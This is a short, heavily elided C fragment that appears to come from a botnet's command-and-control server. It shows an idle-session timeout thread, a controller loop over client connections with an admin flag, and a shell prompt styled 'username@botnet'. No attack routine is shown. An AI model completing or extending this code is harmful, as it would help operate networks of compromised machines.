...
void *detect_afk(void *arg)
{
    ...
    while(1)
    {
        if(time(NULL) - accinfo[the_fd].lastcmd_time > 86400)
        {
            char fbuf[512];
        ...
        if(time(NULL) - accinfo[the_fd].time_logged > 86400)
        {
            char fbuf[512];
...
void *controller_thread(void *arg)
{
    ...
    for(x = 0; x < MAXFDS; x++)
    {
        ...
        if (accinfo[cfd].admin == 1)
            ...
            sprintf(prompt, "\x1b[0;32m%s@botnet\x1b[1;37m:\x1b[0;36mcustomer\033[0m$ ", username);
